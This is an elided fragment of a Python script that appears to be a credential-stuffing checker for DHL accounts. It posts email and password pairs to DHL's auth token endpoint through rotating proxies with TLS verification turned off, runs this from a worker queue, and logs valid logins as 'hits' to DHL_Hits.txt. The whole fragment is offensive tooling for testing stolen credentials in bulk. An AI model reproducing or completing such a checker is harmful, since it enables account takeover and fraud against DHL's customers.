...
def check_account(email, pwd, proxy_dict):
    ...
    try:
        headers = {
            ...
            "Referer": "https://www.dhl.com/global-en/home/our-divisions/ecommerce/mydhl-plus.html"
        }
        ...
        r = s.post("https://api-eu.dhl.com/auth/v1/token", 
                   json=payload, headers=headers, proxies=proxy_dict, timeout=30, verify=False)
...
def worker(q):
    ...
    while True:
        ...
        if result == "hit":
            ...
            with open("DHL_Hits.txt", "a", encoding="utf-8") as f:
...
def main():
    ...
    print(f"{Fore.CYAN}Hits saved to DHL_Hits.txt")
    input(f"\nPress Enter to exit...")
